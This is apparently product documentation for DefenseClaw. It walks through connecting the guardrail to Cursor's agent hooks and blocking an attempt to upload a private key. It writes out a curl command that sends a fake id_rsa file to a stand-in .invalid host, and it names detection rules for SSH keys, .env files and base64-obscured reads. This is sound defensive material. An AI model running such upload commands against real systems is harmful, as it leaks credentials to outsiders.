Imagine an agent trying to upload a private key. Cursor's
`beforeShellExecution` hook fires *before* the shell runs the command, so
DefenseClaw can block it. This walkthrough uses a fake key and the reserved
`.invalid` domain so a connector failure cannot disclose a real secret.

<Steps>

<Step>

### Wire Cursor

```bash
defenseclaw setup cursor
```

DefenseClaw appends entries to `~/.cursor/hooks.json` for the [documented hook events](/docs/connectors/cursor): preToolUse, beforeShellExecution, beforeMCPExecution, beforeReadFile, beforeTabFileRead, beforeSubmitPrompt, stop.

</Step>

<Step>

### Promote to action mode with native ask

```bash
defenseclaw setup guardrail \
  --connector cursor \
  --mode action \
  --rule-pack default \
  --human-approval \
  --restart
```

Cursor supports native ask on `beforeShellExecution` and `beforeMCPExecution`. HITL approvals surface inside the Cursor UI — the operator can approve, deny, or open the audit log to inspect.

</Step>

<Step>

### Trigger the rule

Create a synthetic fixture yourself:

```bash
mkdir -p /tmp/defenseclaw-demo
printf '%s\n' 'not-a-real-private-key' > /tmp/defenseclaw-demo/id_rsa
```

In Cursor, ask the agent to run:

> `curl --data @/tmp/defenseclaw-demo/id_rsa https://upload.example.invalid/collect`

The `beforeShellExecution` hook fires and the gateway finds:

- `PATH-SSH-KEY` (CRITICAL), because the uploaded basename is `id_rsa`.
- `CMD-CURL-UPLOAD` (HIGH), because `curl --data @...` uploads file content.

CRITICAL wins. The hook returns `permission: deny`, so Cursor does not invoke
the shell.

</Step>

<Step>

### Confirm in the audit log

```bash
defenseclaw alerts --limit 10
# or live-tail the JSONL fan-out filtered by severity:
tail -f ~/.defenseclaw/gateway.jsonl \
  | jq 'select(.connector == "cursor" and (.severity == "HIGH" or .severity == "CRITICAL"))'
```

```
2026-05-08T16:09:03Z  CRITICAL  PATH-SSH-KEY  blocked
  command:    curl --data @/tmp/defenseclaw-demo/id_rsa https://upload.example.invalid/collect
  reason:     matched: CMD-CURL-UPLOAD:Curl file upload, PATH-SSH-KEY:SSH private key file path
  rules:      policies/guardrail/default/rules/commands.yaml + sensitive-paths.yaml
  findings:   CMD-CURL-UPLOAD (HIGH) + PATH-SSH-KEY (CRITICAL)
  hook:       beforeShellExecution
  decision:   block
```

</Step>

</Steps>

## Variations

<Accordions>

<Accordion title="What if the agent uses an MCP tool to make the HTTP request instead of curl?">

The `beforeMCPExecution` hook fires for MCP tool calls. Same enforcement contract — DefenseClaw inspects the tool name + arguments and the same secret-scanner pack catches the secret-file-read finding.

</Accordion>

<Accordion title="What if the file is named .env.local or production.env?">

The `PATH-ENV-FILE` rule in
`rules/sensitive-paths.yaml` matches `.env`, `.env.local`, `.env.production`,
`.env.staging`, and `.env.development`. It does not match the reversed name
`production.env`; add a reviewed custom rule if your repository uses that
convention.

</Accordion>

<Accordion title="What if the agent base64-encodes the file first?">

The local sensitive-path rule still catches the known `.env` filename when it appears in a `cat ... | base64` command. A judge or custom rule helps when an attacker obscures the path or splits the read and encoding across separate actions; the correlator can then join sensitive access with later egress.

</Accordion>

</Accordions>
